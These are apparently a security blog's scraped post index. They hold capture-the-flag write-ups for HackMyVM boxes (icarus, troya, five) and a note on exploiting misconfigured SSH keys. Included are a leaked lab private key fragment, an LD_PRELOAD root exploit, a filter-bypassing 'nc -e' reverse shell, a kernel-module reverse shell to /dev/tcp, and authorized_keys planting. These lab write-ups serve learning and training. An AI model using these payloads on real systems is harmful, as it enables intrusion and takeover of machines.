Yq38GzQnZZQcSdvL1yB/N554gQvzJLvmKQbmgLhMRcdDmifUelJYXib2Mjg/BLaRXaEzOomUKR2nyJH7VgU+xzAAAAgQDuqkBp44indqhxwrzbfeLnzQqpZ/rMZXGcvJUttECRbLRfohUftFE5J0PKuT8w0dpacNCVgkT9A0Tc3xRfkyECBQjeKLvdhcufJhQl0pdXDt1cpebE50LE4yHc8vR6FEjhR4P2AbGICJyRS7AX7UnrOWdUIE3FeNP0r5UiSDq16wAAAA1pY2FydXNAaWNhcnVzAQIDBA==-----END OPENSSH PRIVATE KEY-----Save private key┌──(root💀kali)-[/opt/hackmyv/icarus]└─# nano id_rsa ┌──(root💀kali)-[/opt/hackmyv/icarus]└─# chmod 600 id_rsa USE SSH KEYGEN TO FIND USERNAME OF PRIVATE KEY!┌──(root💀kali)-[/opt/hackmyv/icarus]└─# ssh-keygen -y -f id_rsassh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9PCI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyR icarus@icarus┌──(root💀kali)-[/opt/hackmyv/icarus]└─# ssh -i id_rsa icarus@192.168.56.35Linux icarus 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Jan 5 20:44:47 2022 from 192.168.56.3icarus@icarus:~$ whoami;id;hostnameicarusuid=1000(icarus) gid=1000(icarus) groups=1000(icarus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)icarusicarus@icarus:~$ Shell as Rootlinpeas highlighted env_keep+=LD_PRELOAD !icarus@icarus:/tmp$ bash linpeas.sh [+] Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for icarus on icarus: env_reset, mail_badpass, env_keep+=LD_PRELOAD, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User icarus may run the following commands on icarus: (ALL : ALL) NOPASSWD: /usr/bin/id To exploit:icarus@icarus:/tmp$ nano preload.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void _init() {unsetenv(&quot;LD_PRELOAD&quot;);setresuid(0,0,0);system(&quot;/bin/bash -p&quot;);}icarus@icarus:/tmp$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.cpreload.c: In function ‘_init’:preload.c:6:1: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration] setresuid(0,0,0); ^~~~~~~~~icarus@icarus:/tmp$ ls preload.c preload.so icarus@icarus:/tmp$ sudo LD_PRELOAD=/tmp/preload.so idroot@icarus:/tmp# whoami;idrootuid=0(root) gid=0(root) groups=0(root)root@icarus:/tmp# cat /root/root.txt " }, { "title": "troya", "url": "/posts/troya/", "categories": "hackmyvm, mediumm", "tags": "insmod, kernel", "date": "2022-01-06 08:58:00 +0800", "snippet": "OverviewMultiple steps taken to be root. But all really interesting approach of known concept with a twist. After getting reverse-shell require enumeration to link pieces together to find user helena. The difficult part about the privilege escalation is installing older version of linux header on ubuntu for me. Box Difficulty Link Medium hackmyvm Link ReconFind all possible open ports on TCP and UDP:┌──(root💀kali)-[/opt/hackmyv/troya]└─# masscan -p1-65535,U:1-65535 192.168.56.33 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-04 01:25:44 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 22/tcp on 192.168.56.33 Discovered open port 80/tcp on 192.168.56.33 Enumerate ports that were found to be open:┌──(root💀kali)-[/opt/hackmyv/troya]└─# nmap -sVC -p 22,80 192.168.56.33 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 20:31 ESTNmap scan report for 192.168.56.33Host is up (0.00048s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 b0:b8:5e:2c:41:b8:7c:c8:20:e8:09:ff:7a:6f:ff:9f (RSA)| 256 3f:44:9f:25:14:99:40:17:e0:07:1f:2e:67:de:78:18 (ECDSA)|_ 256 c4:0e:93:55:b2:7b:8c:86:c3:e4:6d:01:93:60:d2:b1 (ED25519)80/tcp open http nginx 1.14.2|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).|_http-server-header: nginx/1.14.2MAC Address: 08:00:27:E7:5A:26 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.85 secondsBegin enumerating port 22 &amp;amp; 80.HTTP- TCP 80After enumrating using gobuster and other tools we can only find index.php which leads to a site which request an IP to query.Typically in this scenario we usually try to test if there is a valid command injection exploit. Attempting to a command injection exploit test shows that there are non valid character which were detected. Looks like there are some letters which are not accepted.Our aim next is to find out all the letters which are not valid. We can make a character text file of all the letters using crunch in char.txt.┌──(root💀kali)-[/opt/hackmyv/troya] └─# locate charset.lst /usr/share/crunch/charset.lst ┌──(root💀kali)-[/opt/hackmyv/troya] └─# crunch 1 1 -f charset.lst lalpha-numeric-all-space-sv -o char.txt readcharset: File charset.lst could not be opened The problem is = No such file or directory ┌──(root💀kali)-[/opt/hackmyv/troya] └─# crunch 1 1 -f /usr/share/crunch/charset.lst lalpha-numeric-all-space-sv -o char.txt Notice: Detected unicode characters. If you are piping crunch output to another program such as john or aircrack please make sure that program can handle unicode input. Do you want to continue? [Y/n] Crunch will now generate the following amount of data: 147 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 72 crunch: 100% completed generating output Next , use burpsuite to execute a intruder attack with a sniper payload with the char.txt we just created using crunch.Shell as www-dataWe can see that from the output of burpsuite intruder, the non-valid characters are :Non Valid characters : “,%,\\,’,*,i,a,s,h,;,&amp;lt;,&amp;gt;,^,`,{,},~,\\,\\,#,=,&amp;amp;Commonly, the special characters for to escape the input to execute OS command injection is:&amp;amp;;Newline (0x0a or \\n)&amp;amp;&amp;amp;||| `This means we can only use | in this scenario to escape the input for the command injection to work.Additioanlly, to overcome another constraint of letters not being able to use we can use bash question mark ? Wildcard.**Take note ? cannot be use for commands!For example┌──(root💀kali)-[/opt/hackmyv/troya]└─# lsa.txt bb.txt ccc.txt d e f xx.txt┌──(root💀kali)-[/opt/hackmyv/troya] └─# ls ??.txtbb.txt xx.txt┌──(root💀kali)-[/opt/hackmyv/troya] └─# ls ?d e fTo execute a reverse shell on the website our command will be127.0.0.1 || nc -e /b?n/b??? 192.168.56.3 1234On local attacking machine:┌──(root💀kali)-[/opt/hackmyv/troya]└─# nc -lvnp 1234 listening on [any] 1234 ...connect to [192.168.56.3] from (UNKNOWN) [192.168.56.33] 58220python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;www-data@troya:~/html$ whoami;id;hostnamewhoami;id;hostnamewww-datauid=33(www-data) gid=33(www-data) groups=33(www-data)troyaShell as helenaMultiple things point to helena access. Base64 encoded passwordwww-data@troya:~/html$ lslsindex.php secret.pdfwww-data@troya:~/html$ file secret.pdffile secret.pdfsecret.pdf: ASCII textwww-data@troya:~/html$ cat secret.pdfcat secret.pdfcGF6endvcmQKUsing cyberchef we can see that it is base64 encoded and once decode it is pazzword. mysql running on port 33060 www-data@troya:/tmp$ bash linpeas.sh bash linpeas.sh .......[+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 423/nginx: worker p tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN 423/nginx: worker p tcp6 0 0 :::22 :::* LISTEN - Usernames of users to try from home directorywww-data@troya:/tmp$ ls -la /homels -la /hometotal 20drwxr-xr-x 5 root root 4096 Oct 22 2020 .drwxr-xr-x 18 root root 4096 Oct 22 2020 ..drwxr-xr-x 2 hector hector 4096 Oct 22 2020 hectordrwxr-xr-x 3 helena helena 4096 Oct 22 2020 helenadrwxr-xr-x 2 paul paul 4096 Oct 22 2020 paulAfter which I try to enumerate the mysql server with the username and password found.www-data@troya:/tmp$ mysql -u hector -pmysql -u hector -pEnter password: pazzwordWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 49Server version: 10.3.25-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MariaDB [(none)]&amp;gt; show databases;show databases;+--------------------+| Database |+--------------------+| information_schema || yo |+--------------------+2 rows in set (0.008 sec)Database changedMariaDB [yo]&amp;gt; show tables;show tables;+--------------+| Tables_in_yo |+--------------+| lucky |+--------------+1 row in set (0.000 sec)MariaDB [yo]&amp;gt; select * from lucky;select * from lucky;+----+--------+--------------------+| id | uzer | pazz |+----+--------+--------------------+| 1 | helena | iuyqwejkhdsaiuyewq |+----+--------+--------------------+1 row in set (0.000 sec)Using the credentials:www-data@troya:/tmp$ su helenasu helenaPassword: iuyqwejkhdsaiuyewqhelena@troya:/tmp$ Shell as Roothelena@troya:/home$ sudo -lsudo -lMatching Defaults entries for helena on troya: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser helena may run the following commands on troya: (ALL) NOPASSWD: /usr/sbin/insmodFrom https://linux.die.net/man/8/insmod : insmod - simple program to insert a module into the Linux KernelWhich means that it’s possible to use the command insmod to insert a kernel module. Follow the example below to get a reverse shell abusing this privilege. Credit to hacktricks : https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-2-with-binary#include &amp;lt;linux/kmod.h&amp;gt;#include &amp;lt;linux/module.h&amp;gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;AttackDefense&quot;);MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);MODULE_VERSION(&quot;1.0&quot;);char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.8/4444 0&amp;gt;&amp;amp;1&quot;, NULL};static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };// call_usermodehelper function is used to create user mode processes from kernel spacestatic int __init reverse_shell_init(void) { return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) { printk(KERN_INFO &quot;Exiting\\n&quot;);}module_init(reverse_shell_init);module_exit(reverse_shell_exit);Since troya machine is running linux kernel 4.19.0-12-amd64helena@troya:/tmp$ uname -runame -r4.19.0-12-amd64Our Makefile also has to use linux-headers-4.19.0-12-amd64.obj-m +=reverse-shell.oall: make -C /lib/modules/4.19.0-12-amd64/build M=$(PWD) modulesclean: make -C /lib/modules/4.19.0-12-amd64/build M=$(PWD) cleanIf your like me and uses ubuntu or other source to build exploit sometimes , below is the steps I used to get the source of the old linux headers.Put in /etc/apt/sources.list.d/debian-src.list the below:deb [trusted=yes] https://snapshot.debian.org/archive/debian/20201019T121403Z/ buster maindeb-src [trusted=yes] https://snapshot.debian.org/archive/debian/20201019T121403Z/ buster maindeb [trusted=yes] https://snapshot.debian.org/archive/debian-security/20201019T121403Z/ buster/updates maindeb-src [trusted=yes] https://snapshot.debian.org/archive/debian-security/20201019T121403Z/ buster/updates mainRun in bash:sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9D6D8F6BC857C906 AA8E81B4331F7F50 7638D0442B90D010 CBF8D6FD518E17E1apt-get -o Acquire::Check-Valid-Until=false updateAfter running make command , transfer reverse-shell.ko to victim machine:helena@troya:/tmp$ wget http://192.168.56.3:1235/reverse-shell.kowget http://192.168.56.3:1235/reverse-shell.ko--2022-01-05 03:18:27-- http://192.168.56.3:1235/reverse-shell.koConnecting to 192.168.56.3:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 279832 (273K) [application/octet-stream]Saving to: ‘reverse-shell.ko’reverse-shell.ko 100%[===================&amp;gt;] 273.27K --.-KB/s in 0.001s 2022-01-05 03:18:27 (226 MB/s) - ‘reverse-shell.ko’ saved [279832/279832]helena@troya:/tmp$ sudo /usr/sbin/insmod reverse-shell.kosudo /usr/sbin/insmod reverse-shell.koDon’t forget to catch the reverse shell!┌──(root💀kali)-[/opt/hackmyv/troya]└─# nc -lvnp 4444 listening on [any] 4444 ...connect to [192.168.56.3] from (UNKNOWN) [192.168.56.33] 34110bash: cannot set terminal process group (-1): Inappropriate ioctl for devicebash: no job control in this shellroot@troya:/# whoamiwhoamirootroot@troya:/# cat /root/root.txtcat /root/root.txtpartyishard" }, { "title": "Misconfigured SSH Keys", "url": "/posts/SSH-Read-Write/", "categories": "privilege escalation", "tags": "SSH", "date": "2021-12-31 09:00:00 +0800", "snippet": "Extract from here !Understanding Asymmetric EncryptionBefore diving into the possible attacks, it is crucial to understand the key pair concept that SSH and other asymmetric cryptographic protocols utilize to secure a connection. These use a private key to encrypt information, and a corresponding public key to decrypt it.When communicating to a machine via SSH, a user can authenticate if their private key is considered trustworthy by the server and added to the authorized_keys file, or if their private key corresponds to a public key stored in the server.The default name for public keys is usually id_rsa.pub or id_dsa.pub and the default name for private keys is id_rsa or id_dsa, based on the encryption algorithm used. DSA is known to be insecure.Exploiting SSH KeysThe main two ways of exploiting SSH keys are the following: Accessing readable private SSH keys and using them to authenticate Accessing writable public SSH keys and adding your own one to them to authenticateIf readable private keys or writable public keys are present on the machine, this could allow for an attacker to escalate privileges to root.Public and private keys are generally stored in one of the following locations: /root/.ssh/ /home/user_name/.ssh/ (users home directory) /etc/ssh/ in the paths specified in the ssh_config or sshd_config config filesThe following command can be used to identify any existing public or private keys and their permissions:ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2&amp;gt; /dev/null; find / -name id_dsa 2&amp;gt; /dev/null; find / -name authorized_keys 2&amp;gt; /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsaReadable Private KeysAs mentioned earlier, private keys are used by users to authenticate via SSH. If a private key is stored in a way that makes it accessible to the current user, this means it can be used to perform an authentication as the owner of the private key.The easiest way to exploit this is to simply copy the key over to a Kali host, by simply copying and pasting the contents of the file.In order for the private key to be accepted by SSH, it needs to be only readable and writable only by its owner, otherwise it will complain that the permissions applied are too open.Using the following command to change the file permissions against the newly created SSH private key:chmod 600 id_rsaThe following command can then be used to login as the “Victim” user:ssh -i id_rsa user_name@X.X.X.XGet username of private keysIf you have private key but not sure of the username. The below will read a private OpenSSH format file and print an OpenSSH public key to stdout.┌──(root💀kali)-[/opt/hackmyv/icarus]└─# ssh-keygen -y -f id_rsassh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9PCI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyR icarus@icarusWritable Public KeysThe authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured.The default configuration in most SSH implementations allows users to deploy new authorized keys for themselves and anyone else, which are permanent and may bypass privileged access management systems.If the authorized_keys file is writable to the current user, this can be exploited by adding additional authorized keys.The easiest way to exploit this is to generate a new SSH key pair, add the public key to the file and login in using the private key.The ssh-keygen command line utility can be used to generate a new SSH key pair.The public key can then be copied with the ssh-copy command line tool:ssh-copy-id user_name@X.X.X.XOr simply by using cat to output the contents of the id_rsa.pub file and redirect it to the authorized_keys file:cat ~/.ssh/id_rsa.pub | ssh user_name@X.X.X.X &quot;cat &amp;gt;&amp;gt; /home/user_name/.ssh/authorized_keys&quot;The methods above will only work if SSH access is already available. If not, the contents of the public key can simply be pasted into the authorized_host file. Using xclip to add the public key to the clipboard or Copying the public key to the authorized_hosts file.e.g.www-data@five:/tmp$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /tmp/id_rsa. Your public key has been saved in /tmp/id_rsa.pub. The key fingerprint is: SHA256:AqFOY+gJJbcHcANOjAprNc9ANyZT3hCD/n/gLJEPU6s www-data@fiveThe key&#39;s randomart image is:+---[RSA 2048]----+|*+B++O. ||=B X*.= ||=oO B. . ||==.+ + . ||.o. . + S || * + || X . || E = . || . . |+----[SHA256]-----+www-data@five:/tmp$ ls id_rsa id_rsa.pub systemd-private-c92ecfd176894a7d8dabf029f877607c-systemd-timesyncd.service-c1CO3Mwww-data@five:/tmp$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/authorized_keysAlternatively , instead of creating keys using SSH keygen , port over your id_rsa.pub and ssh through your local machine.On victim Machine:www-data@five:/tmp wget http://192.168.56.3:1235/id_rsa.pubwww-data@five:/tmp$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/authorized_keysOn Local Machine:┌──(root💀kali)-[/opt/hackmyv/five]└─# ssh melisa@192.168.56.27 -i /root/.ssh/id_rsa" }, { "title": "Five", "url": "/posts/five/", "categories": "hackmyvm, mediumm", "tags": "more, cp", "date": "2021-12-30 13:00:00 +0800", "snippet": "OverviewQuite a good box to learn and explore concepts. Box Difficulty Link Medium hackmyvm Link ReconFind all possible open ports on TCP and UDP:┌──(root💀kali)-[/opt/hackmyv/five]└─# masscan -p1-65535,U:1-65535 192.168.56.27 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-28 09:26:24 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 80/tcp on 192.168.56.27 Enumerate ports that were found to be open:┌──(root💀kali)-[/opt/hackmyv/five]└─# nmap -sVC -p 80 192.168.56.27 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 04:30 ESTNmap scan report for 192.168.56.27Host is up (0.00047s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.14.2| http-robots.txt: 1 disallowed entry |_/admin|_http-title: 403 Forbidden|_http-server-header: nginx/1.14.2MAC Address: 08:00:27:E6:69:12 (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.77 secondsHTTP- TCP 80Enumerating using gobuster shows several interesting files. admin,upload.php and upload.html.┌──(root💀kali)-[/opt/hackmyv/five]└─# gobuster dir -u http://192.168.56.27:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; -o gobuster_p80.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.27:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php,php.bak,bak,jsp[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/28 04:32:10 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.27:80/uploads (Status: 301) [Size: 185] [--&amp;gt; http://192.168.56.27/uploads/]http://192.168.56.27:80/admin (Status: 301) [Size: 185] [--&amp;gt; http://192.168.56.27/admin/] http://192.168.56.27:80/upload.html (Status: 200) [Size: 346] http://192.168.56.27:80/upload.php (Status: 200) [Size: 48] http://192.168.56.27:80/robots.txt (Status: 200) [Size: 17] ===============================================================2021/12/28 04:34:05 Finished===============================================================Looks like at upload.html we can upload files onto the server:Let’s upload a test.txt which contains the content : “hello world”.We can see that the file is uploaded at the upload forlder http://192.168.56.27/uploads/test.txt.┌──(root💀kali)-[/opt/hackmyv/five]└─# curl http://192.168.56.27/uploads/test.txt hello worldNext, we should upload a reverse shell.Unfortunately, looks like the php file is unable to be viewed at the uploads folder as we receive a 403 forbidden.Let’s try to instead upload the test.txt onto another folder. Looking at burpsuite , we can see that the file will be upload at uploads/ .Let’s try to change the target to admin instead.Nice, looks like we can upload the file anywhere on the server.Shell as www-dataThis time we will not specify a directory to upload to, so we can target its main folder possibly at /var/www/html in the backend.Catch the reverse shell on local machin and we are in!┌──(root💀kali)-[/opt/hackmyv/five]└─# nc -lvnp 1234 listening on [any] 1234 ...connect to [192.168.56.3] from (UNKNOWN) [192.168.56.27] 33244Linux five 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux 04:59:41 up 37 min, 0 users, load average: 0.00, 0.02, 0.10USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#39;t access tty; job control turned off$ whoami;id;hostnamewww-datauid=33(www-data) gid=33(www-data) groups=33(www-data)FiveShell as melisaDownload and Run linpeas.sh$ cd /tmpcd /tmp$ wget http://192.168.56.3:1235/linpeas.shwget http://192.168.56.3:1235/linpeas.sh--2021-12-28 05:03:33-- http://192.168.56.3:1235/linpeas.shConnecting to 192.168.56.3:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 330173 (322K) [text/x-sh]Saving to: ‘linpeas.sh’linpeas.sh 100%[===================&amp;gt;] 322.43K --.-KB/s in 0.003s 2021-12-28 05:03:33 (123 MB/s) - ‘linpeas.sh’ saved [330173/330173]$ bash linpeas.sh bash linpeas.sh ….[+] Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for www-data on five: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on five: (melisa) NOPASSWD: /bin/cp We can see that (melisa) NOPASSWD: /bin/cp we can run the copy command as melisa. This means we can copy files that once own by www-data and it will become melisa owned file.One thing we can do is to copy over id_rsa/id_rsa.pub keys.Attempt 1Use CP to copy local machine id_rsa.pub to replace melisa id_rsa.pubLocal machine┌──(root💀kali)-[/opt/hackmyv/five]└─# cp /root/.ssh/id_rsa.pub . ┌──(root💀kali)-[/opt/hackmyv/five]└─# python -m SimpleHTTPServer 1235Victim machine$ cd /tmpcd /tmp$ wget http://192.168.56.3:1235/id_rsa.pubwget http://192.168.56.3:1235/id_rsa.pub--2021-12-28 05:12:24-- http://192.168.56.3:1235/id_rsa.pubConnecting to 192.168.56.3:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 563 [application/vnd.exstream-package]Saving to: ‘id_rsa.pub’id_rsa.pub 100%[===================&amp;gt;] 563 --.-KB/s in 0s 2021-12-28 05:12:24 (224 MB/s) - ‘id_rsa.pub’ saved [563/563]$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/id_rsa.pubsudo -u melisa cp id_rsa.pub /home/melisa/.ssh/id_rsa.pubLet’s SSH into melisa!Cant SSH into server because no SSH connection┌──(root💀kali)-[/opt/hackmyv/five]└─# ssh melisa@192.168.56.27 -i id_rsa.pub ssh: connect to host 192.168.56.27 port 22: Connection refusedAttempt 2Looking at the ssh configuratiion can see it’s listening internally on port 4444 internally.$ cat /etc/ssh/sshd_config cat /etc/ssh/sshd_config # $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. Port 4444 #AddressFamily any ListenAddress 127.0.0.1 #ListenAddress :: Now, we try to ssh internally after porting our own id_rsa over!Bringing over id_rsa over from local machine to victim server:$ wget http://192.168.56.3:1235/id_rsawget http://192.168.56.3:1235/id_rsa--2021-12-28 05:32:31-- http://192.168.56.3:1235/id_rsaConnecting to 192.168.56.3:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 2590 (2.5K) [application/octet-stream]Saving to: ‘id_rsa’id_rsa 100%[===================&amp;gt;] 2.53K --.-KB/s in 0s 2021-12-28 05:32:31 (469 MB/s) - ‘id_rsa’ saved [2590/2590]$ chmod 600 id_rsachmod 600 id_rsaSSH as melisa!$ ssh -i id_rsa melisa@localhost -p 4444ssh -i id_rsa melisa@localhost -p 4444Could not create directory &#39;/var/www/.ssh&#39;.The authenticity of host &#39;[localhost]:4444 ([127.0.0.1]:4444)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.Are you sure you want to continue connecting (yes/no)? yesyesFailed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).melisa@localhost&#39;s password: Permission denied, please try again.melisa@localhost&#39;s password: Permission denied, please try again.melisa@localhost&#39;s password: melisa@localhost: Permission denied (publickey,password).Looks like we require not only the publickey but also a password.Attempt 3Reading from https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/.Looks like we are msising on step : Copying the public key to the authorized_hosts file as well!www-data@five:/tmp$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/authorized_keyswww-data@five:/tmp$ chmod 600 id_rsachmod 600 id_rsawww-data@five:/tmp$ ssh -i id_rsa melisa@localhost -p 4444ssh -i id_rsa melisa@localhost -p 4444Could not create directory &#39;/var/www/.ssh&#39;.The authenticity of host &#39;[localhost]:4444 ([127.0.0.1]:4444)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.Are you sure you want to continue connecting (yes/no)? yesyesFailed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).Linux five 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Dec 29 21:57:08 2021 from 127.0.0.1melisa@five:~$ Great we are now melisa!Shell as RootWe can see that /bin/man does not require password and GTFObins has stated we can exploit this to become root.Melisa@five:~$ sudo -lMatching Defaults entries for melisa on five: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser melisa may run the following commands on five: (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clearAttempt 1However running sudo -u root /bin/man /bin/manThis is because as stated in the GTFObin page This invokes the default pager, which is likely to be less, other functions may apply.As we can see reading from the man pages, the default pager is set to pager. Controlling formatted output -P pager, --pager=pager Specify which output pager to use. By default, man uses pager, falling back to cat if pager is not found or is not executable. This option overrides the $MANPAGER environment variable, which in turn overrides the $PAGER environment variable. It is not used in conjunction with -f or -k. The value may be a simple command name or a command with arguments, and may use shell quoting (backslashes, single quotes, or double quotes). It may not use pipes to connect multiple commands; if you need that, use a wrapper script, which may take the file to display either as an argument or on standard input.So instead, we have to use the less command as a pager and exploit it to get it working.melisa@five:~$ which less/usr/bin/lessmelisa@five:/tmp$ sudo -u root /bin/man -P /usr/bin/less manAnd we are root!# whoami;id;hostnamerootuid=0(root) gid=0(root) groups=0(root)five" }, { "title": "Hommie", "url": "/posts/Hommie/", "categories": "hackmyvm, easyy", "tags": "Path Variable, nmap UDP", "date": "2021-12-27 21:00:00 +0800", "snippet": "OverviewHonestly, I learnt alot in this box about nmap UDP scans and the importance of having a proper enumeration technique. Box Difficulty Link Easy hackmyvm Link Explanation behind nmap for UDP Scan.It’s just unreliable and slow. Honestly a full port scan for UDP can take days. If you put parallelism or force it to make it fast, unreliable.Even a normal scan, unreliable.Example from nmap Chapter 5. Port Scanning Techniques and Algorithms for udp :**Example 5.5. UDP scan example**krad# **`nmap -sU -T4 scanme.nmap.org`**Starting Nmap ( http://nmap.org )All 1000 scanned ports on scanme.nmap.org (64.13.134.52) are open|filteredNmap done: 1 IP address (1 host up) scanned in 5.50 secondsIn this case, the scan didn’t narrow down the open ports at all. All 1000 are open|filtered. A new strategy is called for.Thus 